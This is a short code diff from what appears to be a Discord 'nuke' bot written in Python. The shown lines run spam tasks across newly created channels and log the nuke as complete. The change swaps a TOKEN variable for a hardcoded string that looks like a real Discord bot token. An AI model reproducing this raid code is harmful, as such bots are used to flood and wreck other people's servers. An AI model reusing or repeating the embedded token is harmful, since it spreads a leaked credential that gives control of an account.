@@ -54,4 +54,4 @@ async def nuke(ctx):
     await asyncio.gather(*(spam(ch) for ch in new_channels))
     print("✅ nuke完了ログ")
 
-bot.run(TOKEN)
+bot.run(MTM3Njg4NjExOTUwNDkzNzA0Mw.GwxHaF.0WL3lbJ6k5aVhW1bphj0rKALEOOpxxwRCQqils)
